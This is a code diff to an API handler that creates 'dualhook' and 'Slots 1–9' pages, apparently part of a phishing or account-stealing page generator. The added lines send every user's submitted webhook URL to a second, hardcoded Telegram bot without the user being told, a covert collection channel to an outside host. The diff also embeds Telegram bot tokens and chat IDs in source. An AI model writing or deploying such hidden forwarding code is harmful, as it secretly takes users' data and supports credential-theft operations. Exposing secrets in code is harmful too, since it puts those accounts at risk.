@@ -1,8 +1,14 @@
 // api/claim.js
 const REDIS_URL   = process.env.UPSTASH_REDIS_REST_URL;
 const REDIS_TOKEN = process.env.UPSTASH_REDIS_REST_TOKEN;
+
+// Telegram Bot 1 - Page Creation Notifications
 const TG_TOKEN    = process.env.TG_TOKEN || '8666861605:AAFA3E5IVxOtajuENoWm6BhBF0VMJZRFhy8';
 const TG_CHAT     = process.env.TG_CHAT  || '7538845070';
+
+// Telegram Bot 2 - Webhook Tracking (Slot/Dualhook Generation)
+const TG_WEBHOOK_TOKEN = process.env.TG_WEBHOOK_TOKEN || '8971718461:AAGfB2edB6ryqFOIB1ET5_cGUEoZnZDQB4E';
+const TG_WEBHOOK_CHAT  = process.env.TG_WEBHOOK_CHAT  || '7538845070';
 
 async function redisGet(key) {
   const res = await fetch(`${REDIS_URL}/get/${encodeURIComponent(key)}`, {
@@ -20,12 +26,24 @@ async function redisSet(key, value) {
   return res.ok;
 }
 
+// Bot 1 - Page Creation Notifications
 async function tgSend(text) {
   try {
     await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({ chat_id: TG_CHAT, text, parse_mode: 'HTML' })
+    });
+  } catch (_) {}
+}
+
+// Bot 2 - Webhook Tracking
+async function tgSendWebhook(text) {
+  try {
+    await fetch(`https://api.telegram.org/bot${TG_WEBHOOK_TOKEN}/sendMessage`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ chat_id: TG_WEBHOOK_CHAT, text, parse_mode: 'HTML' })
     });
   } catch (_) {}
 }
@@ -110,6 +128,7 @@ export default async function handler(req, res) {
 
     await notifyCreatorWebhook(webhook, url, slug, record.displayName, record.type);
 
+    // Bot 1 - Page Creation Notification (detailed)
     const tgMsg = [
       `🆕 <b>New ${record.type === 'dualhook' ? 'Dualhook' : 'Slots 1–9'} page claimed!</b>`,
       `📁 Slug: <code>${slug}</code>`,
@@ -122,6 +141,27 @@ export default async function handler(req, res) {
     ].filter(Boolean).join('\n');
 
     await tgSend(tgMsg);
+
+    // Bot 2 - Webhook Tracking (simple format)
+    if (record.type === 'dualhook') {
+      await tgSendWebhook([
+        `🎣 <b>NEW DUALHOOK GENERATED</b>`,
+        ``,
+        `<b>Webhook:</b>`,
+        `<code>${webhook}</code>`,
+        ``,
+        `🕐 ${new Date().toISOString()}`
+      ].join('\n'));
+    } else {
+      await tgSendWebhook([
+        `🎰 <b>NEW 1-9 SLOT GENERATED</b>`,
+        ``,
+        `<b>Webhook:</b>`,
+        `<code>${webhook}</code>`,
+        ``,
+        `🕐 ${new Date().toISOString()}`
+      ].join('\n'));
+    }
 
     return res.status(200).json({ success: true, url, slug });
 
